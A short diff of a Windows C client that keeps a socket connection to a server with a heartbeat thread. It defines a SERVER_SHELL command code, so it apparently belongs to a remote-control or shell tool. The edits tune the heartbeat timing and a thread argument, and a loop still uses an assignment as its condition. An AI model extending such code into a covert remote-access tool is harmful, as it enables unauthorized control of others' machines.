@@ -19,7 +19,7 @@
 
 #define bool                                   BOOL
 #define ERROR_SUCCESS                           0L
-#define	HEART_BEAT_TIME		1000 // 心跳时间
+#define	HEART_BEAT_TIME		1000 * 60 * 1// 心跳时间
 #define SERVER_HEARTS                           0
 #define SERVER_RESET                            1
 #define SERVER_SHELL                            2
@@ -320,8 +320,7 @@ BOOL CopyF(char* szPath,char *trPath,int bigger){
     }
 }
 
-void hex2str(unsigned char *inchar, unsigned int len, unsigned char *outtxt)
-{
+void hex2str(unsigned char *inchar, unsigned int len, unsigned char *outtxt){
         unsigned char hbit,lbit;
         unsigned int i;
   for(i=0;i<len;i++)
@@ -477,12 +476,11 @@ void Hearts(void *sock){
         int s = send((SOCKET)sock,(char*)&msg,sizeof(struct CMSG),0);
         if (s <= 0){
             // 心跳包发送失败，服务器挂了
-            printf("Error\n");
             status=OTHER;
             close((SOCKET)sock);
             break;
         }
-        //Sleep(HEART_BEAT_TIME);
+        Sleep(HEART_BEAT_TIME);
     }
     printf("End\n");
     _endthread();
@@ -564,7 +562,7 @@ void Handle(){
         }
     }
     free(address);
-    _beginthread(Hearts,0,(void *)&sock);
+    _beginthread(Hearts,0,(void *)sock);
     status=CONNECT;
 
     while (status=CONNECT){
